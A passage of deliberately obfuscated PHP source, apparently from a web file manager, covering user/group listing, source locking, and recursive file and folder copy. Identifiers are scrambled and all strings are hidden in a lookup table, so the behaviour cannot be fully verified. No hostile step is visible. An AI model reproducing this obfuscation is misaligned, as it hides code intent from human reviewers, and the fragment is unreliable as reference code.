unset($Î¹÷ëØ…); $˜ğì²é[$ï­•Äåß[375]] = array_values($˜ğì²é[$ï­•Äåß[375]]); $˜ğì²é[$ï­•Äåß[372]] = array($ï­•Äåß[2041] => count($˜ğì²é[$ï­•Äåß[375]]), $ï­•Äåß[2039] => $˜ğì²é[$ï­•Äåß[372]][$ï­•Äåß[369]], $ï­•Äåß[2038] => 1, $ï­•Äåß[2040] => 1); } private function _searchFromMeta($±³ºÆí±, $Ñíá‡œ±, $‚Üü›Ê¿) { $ûˆúÈôÖ =& $_SERVER[ë¦»ºéÌ]; $Ñíá‡œ± = strtolower($Ñíá‡œ±); $øö³°¨Å = array($ûˆúÈôÖ[105] => $±³ºÆí±, $ûˆúÈôÖ[380] => array($ûˆúÈôÖ[389], "\45{$Ñíá‡œ±}\x25")); $øö³°¨Å = $this->parseWhereLike($øö³°¨Å); $Ã£ŞÌ’Õ = Model($ûˆúÈôÖ[2270])->where($øö³°¨Å)->limit($‚Üü›Ê¿)->select(); if (!$Ã£ŞÌ’Õ) { return array(); } $Ã£ŞÌ’Õ = array_to_keyvalue($Ã£ŞÌ’Õ, $ûˆúÈôÖ[12], $ûˆúÈôÖ[1632]); $÷¥—ºí† = $this->where(array($ûˆúÈôÖ[1623] => array($ûˆúÈôÖ[7], $Ã£ŞÌ’Õ)))->select(); if (!$÷¥—ºí†) { return array(); } return $÷¥—ºí†; } private function _listDataApplyItem($¾‚½‰¦š) { $°í›Ë¯„ = array($¾‚½‰¦š); $this->_listDataApply($°í›Ë¯„); return $°í›Ë¯„[0]; } private function _listDataApply(&$ã˜óæ) { $Æ¡’ÙÌ® =& $_SERVER[ë¦»ºéÌ]; if (!$ã˜óæ) { return; } array_remove_key($ã˜óæ, $Æ¡’ÙÌ®[869]); $ˆ¹¼ˆß· = array_to_keyvalue($ã˜óæ, $Æ¡’ÙÌ®[12], $Æ¡’ÙÌ®[1632]); $this->_listAppendGroup($ã˜óæ, $ˆ¹¼ˆß·); $this->_listAppendMeta($ã˜óæ, $ˆ¹¼ˆß·); $this->_listAppendSourceRoot($ã˜óæ, $ˆ¹¼ˆß·); } private function _listAppendSourceRoot(&$ìÄ¹‘ÑÉ, $åÂèÇü›) { $Íá‡ì‚ğ =& $_SERVER[ë¦»ºéÌ]; $‚¸À¡¼ = Model($Íá‡ì‚ğ[809])->listSourceRoot(SourceModel::TYPE_USER, $åÂèÇü›); $‚¸À¡¼ = array_to_keyvalue($‚¸À¡¼, $Íá‡ì‚ğ[506]); $‚¸À¡¼ = array_remove_key($‚¸À¡¼, $Íá‡ì‚ğ[506]); foreach ($ìÄ¹‘ÑÉ as &$ƒÏ°°ş) { $ƒÏ°°ş[$Íá‡ì‚ğ[97]] = $‚¸À¡¼[$ƒÏ°°ş[$Íá‡ì‚ğ[1632]]] ? $‚¸À¡¼[$ƒÏ°°ş[$Íá‡ì‚ğ[1632]]] : array(); } unset($ƒÏ°°ş); } private function _listAppendGroup(&$œıÀªÚŠ, $Ú…û³µ ) { $Òçšåòè =& $_SERVER[ë¦»ºéÌ]; $ôÇÂÒóÏ = array($Òçšåòè[1632] => array($Òçšåòè[7], $Ú…û³µ )); $­Ï–”åˆ = Model($Òçšåòè[1889])->where($ôÇÂÒóÏ)->select(); $©¶ü¼±² = array_to_keyvalue($­Ï–”åˆ, $Òçšåòè[12], $Òçšåòè[1800]); $©¶ü¼±² = array_remove_value(array_unique($©¶ü¼±²), $Òçšåòè[202]); if (!$©¶ü¼±² || !$­Ï–”åˆ) { return; } $ôÇÂÒóÏ = array($Òçšåòè[1800] => array($Òçšåòè[7], $©¶ü¼±²)); $‚¢Ù‹” = Model($Òçšåòè[1976])->field($Òçšåòè[2271])->where($ôÇÂÒóÏ)->select(); $‚¢Ù‹” = array_to_keyvalue($‚¢Ù‹”, $Òçšåòè[1800]); $­Ï–”åˆ = array_to_keyvalue_group($­Ï–”åˆ, $Òçšåòè[1632]); foreach ($­Ï–”åˆ as &$°‘›Üºé) { $ò‘™«©Â = array(); foreach ($°‘›Üºé as $ø˜ßÎ°) { if (!$ø˜ßÎ°[$Òçšåòè[1901]]) { continue; } $²ĞŸØÑ¯ = Model($Òçšåòè[509])->listData($ø˜ßÎ°[$Òçšåòè[1901]]); $ò‘™«©Â[] = array($Òçšåòè[1800] => $ø˜ßÎ°[$Òçšåòè[1800]], $Òçšåòè[2272] => $‚¢Ù‹”[$ø˜ßÎ°[$Òçšåòè[1800]]][$Òçšåòè[42]], $Òçšåòè[523] => $‚¢Ù‹”[$ø˜ßÎ°[$Òçšåòè[1800]]][$Òçšåòè[523]], $Òçšåòè[416] => $²ĞŸØÑ¯); } $°‘›Üºé = $ò‘™«©Â; } unset($°‘›Üºé); foreach ($œıÀªÚŠ as &$İÖùõİ£) { $İÖùõİ£[$Òçšåòè[1978]] = array(); if (isset($­Ï–”åˆ[$İÖùõİ£[$Òçšåòè[1632]]])) { $İÖùõİ£[$Òçšåòè[1978]] = $­Ï–”åˆ[$İÖùõİ£[$Òçšåòè[1632]]]; } } unset($İÖùõİ£); } public function userAppendGroup($šßÛãş) { $åùõ¯¸ =& $_SERVER[ë¦»ºéÌ]; if (!$šßÛãş) { return array(); } $this->_listAppendGroup($šßÛãş, array_to_keyvalue($šßÛãş, $åùõ¯¸[12], $åùõ¯¸[1632])); return $šßÛãş; } private function _listAppendMeta(&$Éë—ìŠµ, $ø¸â¡–µ) { $®§à×ô =& $_SERVER[ë¦»ºéÌ]; $ÓãÈ §Œ = UserJobModel::JOB_KEY; $Ç£»şî¦ = array($®§à×ô[2252]); $½ÛØÏáá = array($®§à×ô[1632] => array($®§à×ô[7], $ø¸â¡–µ)); $Ä “Ã— = Model($®§à×ô[2250])->where($½ÛØÏáá)->select(); $Ä “Ã— = array_to_keyvalue_group($Ä “Ã—, $®§à×ô[1632]); foreach ($Ä “Ã— as &$åŸŸ·Â¿) { $À´¾•Ç¥ = array(); foreach ($åŸŸ·Â¿ as $‘Õ¹şä) { if (!in_array($‘Õ¹şä[$®§à×ô[105]], $Ç£»şî¦)) { $À´¾•Ç¥[$‘Õ¹şä[$®§à×ô[105]]] = $‘Õ¹şä[$®§à×ô[380]]; } } $åŸŸ·Â¿ = $À´¾•Ç¥; } unset($åŸŸ·Â¿); $¼ìÉöÑê = Model($®§à×ô[2273]); foreach ($Éë—ìŠµ as &$ÍºŞÀµÔ) { $ƒ†Ú‘Ûô = array(); if (isset($Ä “Ã—[$ÍºŞÀµÔ[$®§à×ô[1632]]])) { $ƒ†Ú‘Ûô = $Ä “Ã—[$ÍºŞÀµÔ[$®§à×ô[1632]]]; } $ÍºŞÀµÔ[$®§à×ô[2274]] = array(); if (isset($ƒ†Ú‘Ûô[$ÓãÈ §Œ])) { $ÍºŞÀµÔ[$®§à×ô[2274]] = $¼ìÉöÑê->getUserJobInfo($ƒ†Ú‘Ûô[$ÓãÈ §Œ]); } } unset($ÍºŞÀµÔ); } protected function groupUserAll($ï¹‡‘Ãò) { $Öš¨ÌÜÒ =& $_SERVER[ë¦»ºéÌ]; if (!$ï¹‡‘Ãò) { return !1; } $ª˜ÃªË¼ = Model($Öš¨ÌÜÒ[1889])->field($Öš¨ÌÜÒ[1632])->where(array($Öš¨ÌÜÒ[1800] => array($Öš¨ÌÜÒ[7], $ï¹‡‘Ãò)))->select(); $ª˜ÃªË¼ = array_to_keyvalue($ª˜ÃªË¼, $Öš¨ÌÜÒ[12], $Öš¨ÌÜÒ[1632]); return array_unique($ª˜ÃªË¼); } public function userSearch($Üíª¨Ì, $ªöœÌÖ† = "\52") { return Model($_SERVER[ë¦»ºéÌ][540])->where($Üíª¨Ì)->field($ªöœÌÖ†)->find(); } } goto C†Ñ±‚ï¿; aÓºÈ‡Ø¿‚: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($«Ò¥šºã) { $¾¯«Şğµ =& $_SERVER[ë¦»ºéÌ]; if (!$this->allowLock()) { return; } $this->_lockCheck($¾¯«Şğµ[551], $«Ò¥šºã); $¶¡şÒä‡ = 1; $this->_lockEvent($«Ò¥šºã, array($¾¯«Şğµ[552], $¾¯«Şğµ[553]), $¶¡şÒä‡); $this->_lockParent($«Ò¥šºã, array($¾¯«Şğµ[553]), $¶¡şÒä‡); $this->_lockEvent($«Ò¥šºã, array($¾¯«Şğµ[554], $¾¯«Şğµ[555]), $¶¡şÒä‡); $this->_lockCheckEnd($¾¯«Şğµ[551], $«Ò¥šºã); } public function lockCopyEnd($ò©¥Æã) { $‡´¿´±Æ =& $_SERVER[ë¦»ºéÌ]; if (!$this->allowLock()) { return; } $÷Ú ÊìÖ = 0; $this->_lockEvent($ò©¥Æã, array($‡´¿´±Æ[552], $‡´¿´±Æ[553]), $÷Ú ÊìÖ); $this->_lockParent($ò©¥Æã, array($‡´¿´±Æ[553]), $÷Ú ÊìÖ); $this->_lockEvent($ò©¥Æã, array($‡´¿´±Æ[554], $‡´¿´±Æ[555]), $÷Ú ÊìÖ); } public function lockWriteStart($±Òùâ‹, $¯Ñ¬îÎø = '') { $¯¡¦¬•è =& $_SERVER[ë¦»ºéÌ]; if (!$this->allowLock()) { return; } $this->_lockCheck($¯¡¦¬•è[552], $±Òùâ‹); $ë­À = 1; $this->_lockKey($¯¡¦¬•è[556] . $±Òùâ‹ . $¯¡¦¬•è[10] . $¯Ñ¬îÎø, $ë­À); $this->_lockEvent($±Òùâ‹, array($¯¡¦¬•è[551], $¯¡¦¬•è[553]), $ë­À); $this->_lockParent($±Òùâ‹, array($¯¡¦¬•è[551], $¯¡¦¬•è[553]), $ë­À); $this->_lockCheckEnd($¯¡¦¬•è[552], $±Òùâ‹); } public function lockWriteEnd($›ô×ô ä, $‹ä†œÚ¬ = '') { $İ€Å•Ì° =& $_SERVER[ë¦»ºéÌ]; if (!$this->allowLock()) { return; } $…Ø¥Õ¥ = 0; $this->_lockKey($İ€Å•Ì°[556] . $›ô×ô ä . $İ€Å•Ì°[10] . $‹ä†œÚ¬, $…Ø¥Õ¥); $this->_lockEvent($›ô×ô ä, array($İ€Å•Ì°[551], $İ€Å•Ì°[553]), $…Ø¥Õ¥); $this->_lockParent($›ô×ô ä, array($İ€Å•Ì°[551], $İ€Å•Ì°[553]), $…Ø¥Õ¥); } public function lockMoveStart($¼ö€™Œ) { $ÄÂİåº¶ =& $_SERVER[ë¦»ºéÌ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÄÂİåº¶[553], $¼ö€™Œ); $«èŒ‘½» = 1; $this->_lockKey($ÄÂİåº¶[557] . $¼ö€™Œ, $«èŒ‘½»); $this->_lockEvent($¼ö€™Œ, array($ÄÂİåº¶[551], $ÄÂİåº¶[552]), $«èŒ‘½»); $this->_lockParent($¼ö€™Œ, array($ÄÂİåº¶[551], $ÄÂİåº¶[553]), $«èŒ‘½»); $this->_lockEvent($¼ö€™Œ, array($ÄÂİåº¶[558], $ÄÂİåº¶[554], $ÄÂİåº¶[555]), $«èŒ‘½»); $this->_lockCheckEnd($ÄÂİåº¶[553], $¼ö€™Œ); } public function lockMoveEnd($ö¸ôÆŠ¯) { $â£ë½‚´ =& $_SERVER[ë¦»ºéÌ]; if (!$this->allowLock()) { return; } $ ²Ÿº¶Ë = 0; $this->_lockKey($â£ë½‚´[557] . $ö¸ôÆŠ¯, $ ²Ÿº¶Ë); $this->_lockEvent($ö¸ôÆŠ¯, array($â£ë½‚´[551], $â£ë½‚´[552]), $ ²Ÿº¶Ë); $this->_lockParent($ö¸ôÆŠ¯, array($â£ë½‚´[551], $â£ë½‚´[553]), $ ²Ÿº¶Ë); $this->_lockEvent($ö¸ôÆŠ¯, array($â£ë½‚´[558], $â£ë½‚´[554], $â£ë½‚´[555]), $ ²Ÿº¶Ë); } private function _lockCheck($ğãâã¡Ş, $ä‡¡Šæ) { $ìä¾…úı =& $_SERVER[ë¦»ºéÌ]; $ÑÏ®¤í¸ = $this->sourceInfo($ä‡¡Šæ); $®òñƒ™û = $ğãâã¡Ş . $ìä¾…úı[10] . $ä‡¡Šæ; $this->_lockTimeStart[$®òñƒ™û] = timeFloat(); if (!is_array($ÑÏ®¤í¸)) { return; } $îÏò’ï¹ = LNG($ìä¾…úı[559]); CacheLock::setErrorMsg($ìä¾…úı[171] . htmlspecialchars($ÑÏ®¤í¸[$ìä¾…úı[42]]) . $ìä¾…úı[538] . $îÏò’ï¹); $this->_lockKey($®òñƒ™û, 1); $this->_lockKey($®òñƒ™û, 0); $İ”ı³É = array_reverse($this->parentLevelArray($ÑÏ®¤í¸[$ìä¾…úı[523]])); foreach ($İ”ı³É as $Šé©—íœ) { $®òñƒ™û = $ğãâã¡Ş . $ìä¾…úı[560] . $Šé©—íœ; if (CacheLock::lockGet($ìä¾…úı[561] . $®òñƒ™û)) { $ÑÏ®¤í¸ = $this->sourceInfo($Šé©—íœ); CacheLock::setErrorMsg($ìä¾…úı[171] . htmlspecialchars($ÑÏ®¤í¸[$ìä¾…úı[42]]) . $ìä¾…úı[538] . $îÏò’ï¹); $this->_lockKey($®òñƒ™û, 1); $this->_lockKey($®òñƒ™û, 0); } } } private function _lockCheckEnd($¢ªŞïÂÒ, $¸€áŞÓ) { $ïÊÆÇç =& $_SERVER[ë¦»ºéÌ]; $ÜşšŒÃ› = $¢ªŞïÂÒ . $ïÊÆÇç[10] . $¸€áŞÓ; CacheLock::setErrorMsg($ïÊÆÇç[384]); if (!isset($this->_lockTimeStart[$ÜşšŒÃ›])) { return; } $©–€¯«÷ = timeFloat() - $this->_lockTimeStart[$ÜşšŒÃ›]; unset($this->_lockTimeStart[$ÜşšŒÃ›]); if ($©–€¯«÷ > 0.5) { unset(self::$cacheSourceInfo[$ïÊÆÇç[460] . $¸€áŞÓ]); } $Â‡´ñ¡Ş = $this->sourceInfo($¸€áŞÓ); if (!$Â‡´ñ¡Ş) { show_json(LNG($ïÊÆÇç[116]), !1); } } private function _lockParent($¾æû¬Õˆ, $ƒŠæ¡Å—, $·úÚÇãÈ) { if (!$this->autoLockSet) { return; } $–‘âà¢™ = $this->sourceInfo($¾æû¬Õˆ); if (!is_array($–‘âà¢™)) { return; } $ïŸå‚£Ã = array_reverse($this->parentLevelArray($–‘âà¢™[$_SERVER[ë¦»ºéÌ][523]])); foreach ($ïŸå‚£Ã as $Çïüìê’) { $this->_lockEvent($Çïüìê’, $ƒŠæ¡Å—, $·úÚÇãÈ); } } private function _lockEvent($–ßéÄ—, $ï®˜‚­ô, $€Â†ˆŠ) { $×”Ëå• =& $_SERVER[ë¦»ºéÌ]; if (!$this->autoLockSet) { return; } foreach ($ï®˜‚­ô as $—¨ö™­) { $”ú•¸¬î = $—¨ö™­ . $×”Ëå•[10] . $–ßéÄ—; if ($€Â†ˆŠ && CacheLock::lockGet($×”Ëå•[561] . $”ú•¸¬î)) { continue; } $this->_lockKey($”ú•¸¬î, $€Â†ˆŠ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Ò¥ûıÂá, $çÆì›˜¯ = 1) { $â™•Üá¬ = $_SERVER[ë¦»ºéÌ][561] . md5($Ò¥ûıÂá); if ($çÆì›˜¯) { if (isset(self::$_lockItemArr[$â™•Üá¬])) { return; } self::$_lockItemArr[$â™•Üá¬] = 1; CacheLock::lock($â™•Üá¬, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$â™•Üá¬])) { return; } unset(self::$_lockItemArr[$â™•Üá¬]); CacheLock::unlock($â™•Üá¬); } } public function isParentOf($ŒñÒ„Œ, $Ú‰¸²‚à) { $²íœìç’ =& $_SERVER[ë¦»ºéÌ]; $Å¹¶¶ÇÑ = $this->sourceInfo($ŒñÒ„Œ); $‡¦ç‚ıÎ = $this->sourceInfo($Ú‰¸²‚à); $°ªŠŸäĞ = $Å¹¶¶ÇÑ[$²íœìç’[523]] . $Å¹¶¶ÇÑ[$²íœìç’[405]] . $²íœìç’[60]; $„—‚âŸ = $‡¦ç‚ıÎ[$²íœìç’[523]] . $‡¦ç‚ıÎ[$²íœìç’[405]] . $²íœìç’[60]; $üªû¯ûı = strpos($„—‚âŸ, $°ªŠŸäĞ) === 0; return $üªû¯ûı; } private $targetIsDelete = 0; public function copy($åí”ë˜, $¸ùÀËÅÁ, $ÍÜİĞç† = REPEAT_REPLACE, $©³§ÄÎ¸ = '') { $½–“é¥Á =& $_SERVER[ë¦»ºéÌ]; $¹äåÚ¹å = $this->sourceInfo($åí”ë˜); $İ”ÄóŞÁ = $this->sourceInfo($¸ùÀËÅÁ); if (!$¹äåÚ¹å || !$İ”ÄóŞÁ || $İ”ÄóŞÁ[$½–“é¥Á[413]] != $½–“é¥Á[99]) { return !1; } if ($this->isParentOf($åí”ë˜, $¸ùÀËÅÁ)) { return !1; } $§èÕáİË = $©³§ÄÎ¸ ? $©³§ÄÎ¸ : $¹äåÚ¹å[$½–“é¥Á[42]]; $this->lockCopyStart($åí”ë˜); $this->lockWriteStart($¸ùÀËÅÁ, $§èÕáİË); $çš•Ä“¡ = array($½–“é¥Á[562] => array(), $½–“é¥Á[563] => array(), $½–“é¥Á[564] => array()); $this->targetIsDelete = intval($¹äåÚ¹å[$½–“é¥Á[433]]); $¾Ãó»ªæ = $this->fileNameExistCache($¸ùÀËÅÁ, $¹äåÚ¹å[$½–“é¥Á[42]]); $ûãˆ§¶Â = $this->_copy($åí”ë˜, $¸ùÀËÅÁ, $ÍÜİĞç†, $çš•Ä“¡, !0, $©³§ÄÎ¸); $this->_childrenListClear(); $this->lockCopyEnd($åí”ë˜); $this->lockWriteEnd($¸ùÀËÅÁ, $§èÕáİË); if ($¹äåÚ¹å[$½–“é¥Á[413]] == $½–“é¥Á[99] && $¾Ãó»ªæ == $ûãˆ§¶Â) { $this->folderSizeResetChildren($¾Ãó»ªæ); } Model($½–“é¥Á[565])->addAll($çš•Ä“¡[$½–“é¥Á[563]], array(), !0); if ($¾Ãó»ªæ != $ûãˆ§¶Â || $¹äåÚ¹å[$½–“é¥Á[413]] == $½–“é¥Á[99]) { Model($½–“é¥Á[566])->eventCopy($ûãˆ§¶Â); } $this->saveAll($çš•Ä“¡[$½–“é¥Á[564]]); Model($½–“é¥Á[204])->linkAdd($çš•Ä“¡[$½–“é¥Á[562]]); $this->folderSizeReset($¸ùÀËÅÁ); $this->updateModifyTime($¸ùÀËÅÁ); return $ûãˆ§¶Â; } private function _copy($‚ò®ò˜‹, $¢®¾ĞÕÚ, $¢·Ø¦¶, &$ğæöŞ¼½, $Œ…šÇŠæ, $ã˜¼‚º = '') { $®íöæ¸ò =& $_SERVER[ë¦»ºéÌ]; $­§–Ï‡ = $this->sourceInfoCache($‚ò®ò˜‹); $Ë”üŞ­½ = $­§–Ï‡[$®íöæ¸ò[413]] == $®íöæ¸ò[99]; $Ó´ª¥’¡ = $ã˜¼‚º ? $ã˜¼‚º : $­§–Ï‡[$®íöæ¸ò[42]]; $³œ¯´…× = $this->fileNameExistCache($¢®¾ĞÕÚ, $Ó´ª¥’¡); if ($Œ…šÇŠæ) { $this->_childrenAllMake($‚ò®ò˜‹); if ($Ë”üŞ­½ && $³œ¯´…×) { $this->_childrenAllMake($³œ¯´…×); } } if (!$³œ¯´…×) { return $this->_copyCreate($‚ò®ò˜‹, $¢®¾ĞÕÚ, $Ó´ª¥’¡, $ğæöŞ¼½); } $ğáÔ¿‘ù = $³œ¯´…×; if ($Ë”üŞ­½) { if ($¢·Ø¦¶ == REPEAT_RENAME_FOLDER) { $Ó´ª¥’¡ = $this->fileNameAutoCache($¢®¾ĞÕÚ, $Ó´ª¥’¡, $¢·Ø¦¶, $Ë”üŞ­½); $ğáÔ¿‘ù = $this->_copyCreate($‚ò®ò˜‹, $¢®¾ĞÕÚ, $Ó´ª¥’¡, $ğæöŞ¼½); } else { $ì´Ö¥¦Ï = $this->_childrenList($‚ò®ò˜‹); foreach ($ì´Ö¥¦Ï as $×ÛÑÂµÎ) { $this->_copy($×ÛÑÂµÎ[$®íöæ¸ò[405]], $³œ¯´…×, $¢·Ø¦¶, $ğæöŞ¼½, !1); } } } else { if ($¢·Ø¦¶ == REPEAT_RENAME || $¢·Ø¦¶ == REPEAT_RENAME_FOLDER) { $Ó´ª¥’¡ = $this->fileNameAutoCache($¢®¾ĞÕÚ, $Ó´ª¥’¡, $¢·Ø¦¶, $Ë”üŞ­½); $ğáÔ¿‘ù = $this->_copyCreate($‚ò®ò˜‹, $¢®¾ĞÕÚ, $Ó´ª¥’¡, $ğæöŞ¼½); } else { if ($¢·Ø¦¶ == REPEAT_REPLACE) { $§¡ÚÒ—Ô = $this->sourceInfoCache($³œ¯´…×); $¢¯ğÊ‰š = $this->fileHistory($§¡ÚÒ—Ô, $­§–Ï‡[$®íöæ¸ò[469]], $­§–Ï‡[$®íöæ¸ò[90]]); if ($¢¯ğÊ‰š) { $ğæöŞ¼½[$®íöæ¸ò[562]][] = $­§–Ï‡[$®íöæ¸ò[469]]; } } else { if ($¢·Ø¦¶ == REPEAT_SKIP) { } } } Hook::trigger($®íöæ¸ò[567], array($®íöæ¸ò[568], $­§–Ï‡, 0)); } return $ğáÔ¿‘ù; } private function _copyCreate($ú¡¢üâ•, $Çúûğ, $ªşĞé–½, &$×°’Ã˜) { $“ÙªË =& $_SERVER[ë¦»ºéÌ]; $ÊìÜÇŠ = $this->sourceInfoCache($ú¡¢üâ•); $ÓÄ•µÁ“ = $this->sourceInfoCache($Çúûğ); $“ÚÜó×· = $this->_makeItemData($ÊìÜÇŠ, $ÓÄ•µÁ“, $ªşĞé–½); Hook::trigger($“ÙªË[569], $“ÚÜó×·); Hook::trigger($“ÙªË[570], array($“ÙªË[571], $“ÚÜó×·, 0)); $×µÄ¨ŞÕ = $this->add($“ÚÜó×·); $ğƒÚ¸â¶ = array($“ÙªË[405] => $×µÄ¨ŞÕ, $“ÙªË[42] => $ªşĞé–½); $this->_copyApplyMeta($ğƒÚ¸â¶, $×°’Ã˜); if ($ÊìÜÇŠ[$“ÙªË[413]] != $“ÙªË[99]) { $×°’Ã˜[$“ÙªË[562]][] = $ÊìÜÇŠ[$“ÙªË[469]]; return $×µÄ¨ŞÕ; } $¸Úª¥¼ = array(); $Û¨Ÿïü = array(); $this->_childrenListAll($ú¡¢üâ•, $¸Úª¥¼); $…Ò¹‡Ì¶ = count($¸Úª¥¼); if ($…Ò¹‡Ì¶ == 0) { return $×µÄ¨ŞÕ; } $àêùŞñ€ = $this->sourceInfo($×µÄ¨ŞÕ); foreach ($¸Úª¥¼ as $ğı¿Ù¦÷) { $¸óº¨ = $this->_makeItemData($ğı¿Ù¦÷, $àêùŞñ€, $ğı¿Ù¦÷[$“ÙªË[42]]); $¸óº¨[$“ÙªË[523]] = $ğı¿Ù¦÷[$“ÙªË[523]]; $Û¨Ÿïü[] = $¸óº¨; } $this->chunkEventSet($“ÙªË[572], array($“ÙªË[573], $“ÚÜó×·, $…Ò¹‡Ì¶)); $this->addAll($Û¨Ÿïü, array(), !1); $ëç±¬Š» = $this->where(array($“ÙªË[500] => $×µÄ¨ŞÕ))->select(); $©ŒËâ‹õ = $this->_childrenMakeRelation($¸Úª¥¼, $ëç±¬Š»); $©ŒËâ‹õ[$ú¡¢üâ•] = $×µÄ¨ŞÕ; $–»¤ËïŸ = array(); $¾†ø¦ù¼ = array(); foreach ($ëç±¬Š» as $ğı¿Ù¦÷) { $·÷ş¼‰ = $ğı¿Ù¦÷[$“ÙªË[405]]; $¡È‚©­Ä = $this->_childrenMatch($©ŒËâ‹õ, $ğı¿Ù¦÷, $àêùŞñ€); $–»¤ËïŸ[] = array($“ÙªË[405], $·÷ş¼‰, $“ÙªË[500], $¡È‚©­Ä[$“ÙªË[500]]); $¾†ø¦ù¼[] = array($“ÙªË[405], $·÷ş¼‰, $“ÙªË[523], $¡È‚©­Ä[$“ÙªË[523]]); $this->_copyApplyMeta($ğı¿Ù¦÷, $×°’Ã˜); if ($ğı¿Ù¦÷[$“ÙªË[413]] != $“ÙªË[99]) { $×°’Ã˜[$“ÙªË[562]][] = $ğı¿Ù¦÷[$“ÙªË[469]]; } } $this->chunkEventSet($“ÙªË[574], array($“ÙªË[575], $“ÚÜó×·, $…Ò¹‡Ì¶)); $this->saveAll($–»¤ËïŸ); $this->chunkEventSet($“ÙªË[576], array($“ÙªË[577], $“ÚÜó×·, $…Ò¹‡Ì¶)); $this->saveAll($¾†ø¦ù¼); return $×µÄ¨ŞÕ; } private function _childrenMakeRelation($Ï›È´ë, $Áí“Ùß’) { $‚ç˜ùÆ =& $_SERVER[ë¦»ºéÌ]; $Ó…öõËŒ = array(); $şÊô¼–© = array(); foreach ($Ï›È´ë as $ÜÆêÜ¥) { $í³ê˜Âè = $ÜÆêÜ¥[$‚ç˜ùÆ[42]] . $‚ç˜ùÆ[8] . $ÜÆêÜ¥[$‚ç˜ùÆ[523]]; $Ó…öõËŒ[$í³ê˜Âè] = $ÜÆêÜ¥[$‚ç˜ùÆ[405]]; } foreach ($Áí“Ùß’ as $ÜÆêÜ¥) { $í³ê˜Âè = $ÜÆêÜ¥[$‚ç˜ùÆ[42]] . $‚ç˜ùÆ[8] . $ÜÆêÜ¥[$‚ç˜ùÆ[523]]; $ª²èü ó = $Ó…öõËŒ[$í³ê˜Âè]; $şÊô¼–©[$ª²èü ó] = $ÜÆêÜ¥[$‚ç˜ùÆ[405]]; } return $şÊô¼–©; } private function _childrenMatch($º¶ß««Ç, $Çôæêçë, $º³ÛÊì) { $‰åÄóœÂ =& $_SERVER[ë¦»ºéÌ]; $äñ‘» = $º³ÛÊì[$‰åÄóœÂ[523]]; $œäû’ = $this->parentLevelArray($Çôæêçë[$‰åÄóœÂ[523]]); foreach ($œäû’ as $¡‚ÃğÃô) { if (isset($º¶ß««Ç[$¡‚ÃğÃô])) { $äñ‘» .= $º¶ß««Ç[$¡‚ÃğÃô] . $‰åÄóœÂ[578]; } } $äñ‘» = rtrim($äñ‘», $‰åÄóœÂ[60]) . $‰åÄóœÂ[60]; $°ÉÒ¹Õ¡ = $this->parentLevelArray($äñ‘»); $Ò³±»Ù« = $°ÉÒ¹Õ¡[count($°ÉÒ¹Õ¡) - 1]; return array($‰åÄóœÂ[500] => $Ò³±»Ù«, $‰åÄóœÂ[523] => $äñ‘»); } private function _makeItemData($Ñá—Ø©ö, $ùäÑºÂŸ, $£ã•¬´) { $åÜÖÆªô =& $_SERVER[ë¦»ºéÌ]; $ÙÎ¨»ßˆ = array($åÜÖÆªô[579] => $Ñá—Ø©ö[$åÜÖÆªô[413]], $åÜÖÆªô[423] => $£ã•¬´, $åÜÖÆªô[580] => $Ñá—Ø©ö[$åÜÖÆªô[415]] ? $Ñá—Ø©ö[$åÜÖÆªô[415]] : $åÜÖÆªô[12], $åÜÖÆªô[470] => $Ñá—Ø©ö[$åÜÖÆªô[469]] ? $Ñá—Ø©ö[$åÜÖÆªô[469]] : 0, $åÜÖÆªô[581] => $Ñá—Ø©ö[$åÜÖÆªô[90]] ? $Ñá—Ø©ö[$åÜÖÆªô[90]] : 0, $åÜÖÆªô[582] => intval($ùäÑºÂŸ[$åÜÖÆªô[414]]), $åÜÖÆªô[583] => intval($ùäÑºÂŸ[$åÜÖÆªô[506]]), $åÜÖÆªô[584] => intval(USER_ID), $åÜÖÆªô[585] => intval(USER_ID), $åÜÖÆªô[404] => intval($ùäÑºÂŸ[$åÜÖÆªô[405]]), $åÜÖÆªô[586] => $ùäÑºÂŸ[$åÜÖÆªô[523]] . $ùäÑºÂŸ[$åÜÖÆªô[405]] . $åÜÖÆªô[60], $åÜÖÆªô[427] => $Ñá—Ø©ö[$åÜÖÆªô[96]] ? $Ñá—Ø©ö[$åÜÖÆªô[96]] : time(), $åÜÖÆªô[432] => 0, $åÜÖÆªô[587] => $åÜÖÆªô[12]); return $ÙÎ¨»ßˆ; } private function _copyApplyMeta($„öÄ¦², &$öÁ»ŒÉ©) { $°Ô½«—Ø =& $_SERVER[ë¦»ºéÌ]; $“Ñ•¬Ò• = $„öÄ¦²[$°Ô½«—Ø[405]]; $Şí·Ã¿² = $„öÄ¦²[$°Ô½«—Ø[42]]; if (!isset($„öÄ¦²[$°Ô½«—Ø[588]]) || !$„öÄ¦²[$°Ô½«—Ø[588]] || $„öÄ¦²[$°Ô½«—Ø[588]] == $°Ô½«—Ø[202]) { $öÁ»ŒÉ©[$°Ô½«—Ø[564]][] = array($°Ô½«—Ø[405], $“Ñ•¬Ò•, $°Ô½«—Ø[588], short_id($“Ñ•¬Ò•)); } if (Input::check($Şí·Ã¿², $°Ô½«—Ø[589])) { $öÁ»ŒÉ©[$°Ô½«—Ø[563]][] = array($°Ô½«—Ø[405] => $“Ñ•¬Ò•, $°Ô½«—Ø[105] => $°Ô½«—Ø[466], $°Ô½«—Ø[380] => str_replace($°Ô½«—Ø[63], $°Ô½«—Ø[12], Pinyin::get($Şí·Ã¿²))); $öÁ»ŒÉ©[$°Ô½«—Ø[563]][] = array($°Ô½«—Ø[405] => $“Ñ•¬Ò•, $°Ô½«—Ø[105] => $°Ô½«—Ø[465], $°Ô½«—Ø[380] => Pinyin::get($Şí·Ã¿², $°Ô½«—Ø[590])); } $öÁ»ŒÉ©[$°Ô½«—Ø[563]][] = array($°Ô½«—Ø[405] => $“Ñ•¬Ò•, $°Ô½«—Ø[105] => $°Ô½«—Ø[444], $°Ô½«—Ø[380] => KodSort::makeStr($Şí·Ã¿²)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($¯ì°¥Ş) { $İË¨Á»á =& $_SERVER[ë¦»ºéÌ]; $â±£„Ø = $this->sourceInfo($¯ì°¥Ş); $Ö•ã¡«ü = $İË¨Á»á[591]; $¾–ÎÍúô = 